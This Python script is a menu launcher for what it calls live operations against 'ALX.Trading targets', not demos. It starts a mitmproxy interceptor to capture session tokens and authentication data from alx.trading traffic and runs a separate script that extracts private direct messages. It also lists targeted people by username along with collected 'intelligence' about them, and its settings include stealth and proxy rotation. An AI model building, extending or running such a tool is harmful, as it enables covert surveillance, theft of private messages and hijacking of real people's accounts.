#!/usr/bin/env python3
"""
🚀 REAL OPERATIONS LAUNCHER
==========================
Launch real operations against ALX.Trading targets
NO DEMOS - LIVE OPERATIONS ONLY
"""

import os
import sys
import subprocess
import sqlite3
from datetime import datetime

def show_real_operations_menu():
    """Show menu for real operations"""
    print("🎯 REAL ALX.TRADING OPERATIONS")
    print("="*50)
    print("⚠️  LIVE OPERATIONS MODE - NO SIMULATIONS")
    print()
    
    # Show current real targets
    conn = sqlite3.connect('data/project_operations.db')
    c = conn.cursor()
    c.execute('SELECT COUNT(*) FROM targets WHERE status = "active"')
    target_count = c.fetchone()[0]
    conn.close()
    
    print(f"🎯 Active Targets: {target_count}")
    print("🌐 Real Traffic Interceptor: Ready")
    print("💀 Real DM Extractor: Ready")
    print("🔥 Real Data Collection: Active")
    print()
    
    print("📋 AVAILABLE REAL OPERATIONS:")
    print("1. 🎯 Launch Real DM Extraction")
    print("2. 🌐 Start Real Traffic Interception")
    print("3. 📊 View Real Target Intelligence")
    print("4. 🔥 Combined Real Operation")
    print("5. 📁 View Collected Real Data")
    print("6. ⚙️  Configure Real Operation")
    print("0. ❌ Exit")
    print()

def launch_real_dm_extraction():
    """Launch real DM extraction"""
    print("🚀 LAUNCHING REAL DM EXTRACTION")
    print("="*40)
    
    try:
        subprocess.run([sys.executable, 'real_dm_extractor.py'], 
                      cwd='/workspaces/sugarglitch-realops')
    except Exception as e:
        print(f"❌ Error launching DM extractor: {e}")

def start_real_traffic_interception():
    """Start real traffic interception"""
    print("🌐 STARTING REAL TRAFFIC INTERCEPTION")
    print("="*45)
    print("🎯 Intercepting live ALX.Trading traffic...")
    print("🔍 Proxy listening on port 8080")
    print("💾 Real data saved to database")
    print()
    print("⚠️  Configure your browser proxy to: 127.0.0.1:8080")
    print("📱 Then browse to alx.trading to capture traffic")
    print()
    print("🚀 Starting mitmproxy...")
    
    try:
        subprocess.run(['mitmdump', '-s', 'real_alx_interceptor.py', 
                       '--listen-port', '8080', '--set', 
                       'confdir=/workspaces/sugarglitch-realops/sessions/'],
                      cwd='/workspaces/sugarglitch-realops')
    except KeyboardInterrupt:
        print("\n⏹️  Traffic interception stopped")
    except Exception as e:
        print(f"❌ Error starting interceptor: {e}")

def view_real_target_intelligence():
    """View collected real target intelligence"""
    print("📊 REAL TARGET INTELLIGENCE")
    print("="*35)
    
    # Show real targets
    conn = sqlite3.connect('data/project_operations.db')
    c = conn.cursor()
    
    c.execute('''SELECT username, full_name, target_type, notes, created_at
                 FROM targets WHERE status = "active" ORDER BY priority''')
    targets = c.fetchall()
    
    print(f"🎯 ACTIVE REAL TARGETS ({len(targets)}):")
    for target in targets:
        print(f"  • {target[1]} (@{target[0]}) - {target[2]}")
        if target[3]:
            print(f"    Notes: {target[3]}")
        print()
    
    # Show DM data
    c.execute('SELECT COUNT(*) FROM dms')
    dm_count = c.fetchone()[0]
    print(f"💬 Collected DMs: {dm_count}")
    
    # Show personal data
    c.execute('SELECT COUNT(*) FROM personal_data')
    personal_count = c.fetchone()[0]
    print(f"👤 Intelligence Points: {personal_count}")
    
    conn.close()
    
    # Show intercepted data if exists
    if os.path.exists('data/real_intercepted_data.db'):
        print(f"\n🌐 INTERCEPTED REAL TRAFFIC:")
        conn = sqlite3.connect('data/real_intercepted_data.db')
        c = conn.cursor()
        
        # Check tables exist
        tables = ['real_sessions', 'real_auth_data', 'real_api_calls', 'real_trading_data']
        for table in tables:
            try:
                c.execute(f'SELECT COUNT(*) FROM {table}')
                count = c.fetchone()[0]
                print(f"  • {table.replace('real_', '').replace('_', ' ').title()}: {count}")
            except:
                print(f"  • {table.replace('real_', '').replace('_', ' ').title()}: 0")
        
        conn.close()

def combined_real_operation():
    """Launch combined real operation"""
    print("🔥 COMBINED REAL OPERATION")
    print("="*30)
    print("🎯 This will launch:")
    print("  1. Real traffic interception")
    print("  2. Real DM extraction")
    print("  3. Live data collection")
    print()
    
    confirm = input("❓ Proceed with combined real operation? (type 'YES' to confirm): ")
    if confirm.strip().upper() != 'YES':
        print("❌ Operation cancelled")
        return
    
    print("🚀 Starting combined real operation...")
    
    # Start traffic interceptor in background
    print("🌐 Starting traffic interceptor...")
    interceptor_process = subprocess.Popen([
        'mitmdump', '-s', 'real_alx_interceptor.py', 
        '--listen-port', '8080'
    ], cwd='/workspaces/sugarglitch-realops')
    
    print("✅ Traffic interceptor started (PID: {})".format(interceptor_process.pid))
    print("🎯 Now launch DM extraction in parallel...")
    
    try:
        # Launch DM extractor
        subprocess.run([sys.executable, 'real_dm_extractor.py'],
                      cwd='/workspaces/sugarglitch-realops')
    except KeyboardInterrupt:
        print("\n⏹️  Combined operation stopped")
    finally:
        print("🛑 Stopping traffic interceptor...")
        interceptor_process.terminate()

def view_collected_real_data():
    """View all collected real data"""
    print("📁 COLLECTED REAL DATA")
    print("="*25)
    
    # Main database
    if os.path.exists('data/project_operations.db'):
        print("📊 Main Database (data/project_operations.db):")
        conn = sqlite3.connect('data/project_operations.db')
        c = conn.cursor()
        
        # Recent DMs
        c.execute('SELECT sender, message, timestamp FROM dms ORDER BY timestamp DESC LIMIT 5')
        recent_dms = c.fetchall()
        print(f"  💬 Recent DMs ({len(recent_dms)}):")
        for dm in recent_dms:
            direction = "→" if dm[0] == "outgoing" else "←"
            print(f"    {direction} [{dm[2]}] {dm[1][:50]}...")
        
        # Personal data
        c.execute('SELECT key, value FROM personal_data LIMIT 10')
        personal_data = c.fetchall()
        print(f"  👤 Intelligence ({len(personal_data)} points):")
        for data in personal_data:
            print(f"    • {data[0]}: {data[1]}")
        
        conn.close()
    
    # Intercepted data
    if os.path.exists('data/real_intercepted_data.db'):
        print(f"\n🌐 Intercepted Real Data:")
        conn = sqlite3.connect('data/real_intercepted_data.db')
        c = conn.cursor()
        
        # Recent sessions
        try:
            c.execute('SELECT domain, session_id, timestamp FROM real_sessions ORDER BY timestamp DESC LIMIT 3')
            sessions = c.fetchall()
            print(f"  🔑 Recent Sessions ({len(sessions)}):")
            for session in sessions:
                print(f"    • {session[0]}: {session[1][:20]}... [{session[2]}]")
        except:
            print("  🔑 No sessions yet")
        
        # Auth data
        try:
            c.execute('SELECT domain, auth_type, timestamp FROM real_auth_data ORDER BY timestamp DESC LIMIT 3')
            auth_data = c.fetchall()
            print(f"  🔐 Recent Auth Data ({len(auth_data)}):")
            for auth in auth_data:
                print(f"    • {auth[0]}: {auth[1]} [{auth[2]}]")
        except:
            print("  🔐 No auth data yet")
        
        conn.close()

def configure_real_operation():
    """Configure real operation settings"""
    print("⚙️  CONFIGURE REAL OPERATION")
    print("="*35)
    
    # Load current config
    if os.path.exists('config/operational_config.json'):
        with open('config/operational_config.json', 'r') as f:
            config = json.load(f)
        
        print("📋 Current Configuration:")
        print(f"  Mode: {config.get('mode', 'unknown')}")
        print(f"  Target Platform: {config.get('target_platform', 'unknown')}")
        print(f"  Stealth Level: {config.get('stealth_level', 'unknown')}")
        print(f"  Rate Limiting: {config.get('rate_limiting', {}).get('enabled', 'unknown')}")
        print(f"  Proxy Rotation: {config.get('proxy_rotation', {}).get('enabled', 'unknown')}")
    else:
        print("⚠️  No configuration found - using defaults")

def main():
    """Main launcher"""
    while True:
        show_real_operations_menu()
        
        try:
            choice = input("Select operation (0-6): ").strip()
            
            if choice == '0':
                print("👋 Exiting real operations")
                break
            elif choice == '1':
                launch_real_dm_extraction()
            elif choice == '2':
                start_real_traffic_interception()
            elif choice == '3':
                view_real_target_intelligence()
            elif choice == '4':
                combined_real_operation()
            elif choice == '5':
                view_collected_real_data()
            elif choice == '6':
                configure_real_operation()
            else:
                print("❌ Invalid choice")
            
            input("\nPress Enter to continue...")
        
        except KeyboardInterrupt:
            print("\n👋 Exiting...")
            break
        except Exception as e:
            print(f"❌ Error: {e}")
            input("Press Enter to continue...")

if __name__ == "__main__":
    main()
